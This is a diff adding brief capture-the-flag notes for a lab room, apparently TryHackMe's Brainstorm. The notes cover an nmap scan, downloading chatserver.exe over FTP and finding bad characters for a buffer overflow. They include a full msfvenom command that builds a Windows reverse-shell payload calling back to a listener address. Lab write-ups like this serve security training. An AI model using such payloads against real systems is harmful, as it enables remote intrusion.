@@ -1,0 +1,18 @@
+# Brain Storm
+
+## Spin up nmap 
+nmap -sC -sV -oN -Pn nmap/initial 10.10.139.57
+
+## accessing ftp file
+download the chatserver.exe,
+
+## analyze it in windows, the step are from the nmap/thm/basic overflow 
+## find exploit badchars.
+
+## found exploit and generating reverse shell client :
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.251 LPORT=1337 -b "\x00" -f python EXITFUNC=thread
+
+## generate another exploit script, and hook it with msf venom
+
+## got connection
+## and got flag in C:\Users\drake\Desktop
